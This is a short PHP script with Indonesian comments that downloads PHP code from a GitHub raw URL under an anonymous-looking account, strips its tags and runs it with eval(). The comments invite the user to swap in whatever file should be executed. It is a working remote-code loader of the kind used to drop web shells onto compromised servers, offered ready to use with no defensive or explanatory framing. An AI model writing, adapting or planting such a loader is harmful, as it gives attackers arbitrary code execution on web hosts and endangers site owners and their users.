<?php

class Downloader
{
    // ==================================================
    // GANTI URL DI SINI (isi file yang mau dieksekusi)
    // ==================================================
    public $content = 'https://github.com/unknown-3x/unknown/raw/refs/heads/main/-/d22.php';

    public function downloadContent($url)
    {
        if (function_exists('file_get_contents')) {
            return @file_get_contents($url);
        } elseif (function_exists('fopen') && ini_get('allow_url_fopen')) {
            $fstream = @fopen($url, 'rb');

            if (!$fstream) {
                return false;
            }

            $content = stream_get_contents($fstream);
            fclose($fstream);

            return $content;
        } elseif (function_exists('curl_init')) {
            $ch = curl_init();

            curl_setopt($ch, CURLOPT_URL, $url);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
            curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 2);
            curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, true);
            curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
            curl_setopt($ch, CURLOPT_TIMEOUT, 30);

            $content = curl_exec($ch);

            if (curl_error($ch)) {
                curl_close($ch);
                return false;
            }

            curl_close($ch);

            return $content;
        }

        return false;
    }
}

// Penggunaan
$downloader = new Downloader();

// URL diambil dari properti $content di atas
$url = $downloader->content;

$result = $downloader->downloadContent($url);

if ($result !== false) {
    /* buang BOM dan tag pembuka/penutup PHP supaya eval() tidak parse error */
    $code = preg_replace(
        ['/^\xEF\xBB\xBF/', '/^\s*<\?(?:php)?/i', '/\?>\s*$/'],
        '',
        $result
    );

    eval($code);
} else {
    echo "Gagal mengambil konten dari URL.";
}

?>
